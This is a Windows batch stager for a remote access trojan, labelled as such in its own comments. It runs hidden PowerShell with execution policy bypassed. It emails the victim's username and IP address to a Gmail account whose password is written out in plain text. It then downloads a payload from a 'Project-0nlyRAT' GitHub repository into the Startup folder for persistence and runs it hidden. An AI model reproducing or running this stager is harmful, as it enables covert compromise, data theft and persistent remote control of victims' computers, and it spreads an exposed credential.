@echo off

@rem initial stager for the rat

set InitialPath=%cd%
set StartupDir=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup

@rem go to startup
cd %StartupDir%

@rem Initial reconnaissance
powershell.exe -nop -ep bypass -w hidden -c "&{Send-MailMessage -from 'defalttests@gmail.com' -to 'defalttests@gmail.com' -subject \"$env:username $((get-netipaddress -addressfamily ipv4^|?{$_.interfacealias -ne 'Loopback Pseudo-Interface 1'}).ipaddress^|select -last 1)\" -body 'test mail' -smtpserver 'smtp.gmail.com' -port '587' -usessl -credential (new-object -typename system.management.automation.pscredential -argumentlist 'defalttests@gmail.com',(convertto-securestring 'nkos qxgo yxvo brmr' -asplaintext -force))}"


@rem Download payload
powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/wget.cmd' -outfile '.\wget.cmd'"

@rem run the payload
powershell -noprofile start-process powershell.exe -windowstyle hidden ".\wget.cmd"

@rem move back to saved directory
cd %InitialPath%

@REM del initial.cmd

@REM (
@REM     echo @echo off
@REM     echo :loop
@REM     echo start /min cmd /c "popup.vbs"
@REM     echo goto loop
@REM )>payload.cmd

